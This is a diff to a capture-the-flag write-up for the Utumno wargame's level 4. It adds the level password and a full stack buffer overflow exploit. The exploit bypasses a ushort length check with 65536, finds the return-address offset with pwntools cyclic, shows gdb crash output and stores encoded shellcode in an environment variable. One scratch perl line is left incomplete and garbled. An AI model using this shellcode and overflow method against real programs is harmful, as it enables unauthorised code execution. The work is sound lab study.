@@ -251,9 +251,10 @@ perl -e 'print "\x24\x00\x26\xd5\x20\xff\x2e\xff"' | ./utumno3
 ###################################################################################################
 
 Level:    4
-Exploit:  
-Password: 
+Exploit:  buffer overflow
+Password: vY134qxapL
 
+GDB is unable to properly analyze the program
 Program requires 2 args otherwise segfaults. Decompiling shows the following:
 	int main(int argc,char **argv) {
 		int val;
@@ -276,6 +277,37 @@ be less than 63 not the entire argument 1.
 A large value such as 65536 is out of range and thus (ushort)val will be 0, <= 63.
 
 For example input of ./utumno4 65536 (perl -e 'print "\x41"x65535') will cause a segfault because
-it will have overwritten the return address
+it will have overwritten the return address. To find the exact address which overwrites the return
+address use pwntools:
+	python3 - << 'EOF' > in     or     python3 - << 'EOF'
+	from pwn import *
+	print(cyclic(300))     or     print(cyclic_find(0x6161616c))
+	EOF
+
+Using this found that the buffer offset of 65284 overwrites the return address. 
+
+In gdb:
+  run 65536 "$(perl -e 'print "\x41"x65286 . "\x42"x4 . "\x43"x246')"
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+Now we can create an environment var or buffer, with exploit and overwrite the return address to 
+point to the shellcode.
+
+perl -e 'print "\x41"x . "\x90"x200 . "" . "\x\x\x\x" '
+
+$ export EXPLOIT=$(perl -e 'print "\x90"x100 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80
+  \xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b
+	\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
+
+Using gdb, EXPLOIT environment variable was found at: 0xffffd55e
+After playing around with slightly varying return addresses, the following exploit worked
+$ ./utumno4 65536 $(perl -e 'print "\x41"x65286 . "\x50\xd5\xff\xff"x4 . "\x43"x246')
+
+###################################################################################################
+
+Level:    5
+Exploit:  
+Password: 
 
 ###################################################################################################
